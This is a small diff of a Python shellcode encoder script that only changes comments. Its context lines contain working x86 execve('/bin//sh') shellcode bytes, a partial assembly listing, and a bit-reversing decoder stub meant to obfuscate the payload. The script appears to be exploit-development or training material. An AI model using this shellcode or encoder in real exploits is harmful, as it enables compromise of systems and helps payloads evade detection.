@@ -4,6 +4,7 @@ from sys import argv
 
 libc = CDLL("libc.so.6")
 
+# Max length : 255 bytes
 # Execve("/bin//sh", null, null) 
 shellcode = "\\x31\\xc9\\xf7\\xe1\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\xb0\\x0b\\xcd\\x80"
 
@@ -18,7 +19,7 @@ shellcode = "\\x31\\xc9\\xf7\\xe1\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\
 #    mov al, 0x0b
 #    int 0x80
 
-# Max payload to encode length : 255 bytes
+# Reverse bits decoder
 decoder = "\\xeb\\x17\\x8b\\x1c\\x24\\x31\\xc9\\xb1{0}\\x51\\xb1\\x08\\xd0\\x2b\\x10\\xc0\\xe2\\xfa\\x88\\x03\\x43\\x59\\xe2\\xf1\\xc3\\xe8\\xe4\\xff\\xff\\xff{1}"
 
 # Convert the shellcode string into a bytes object
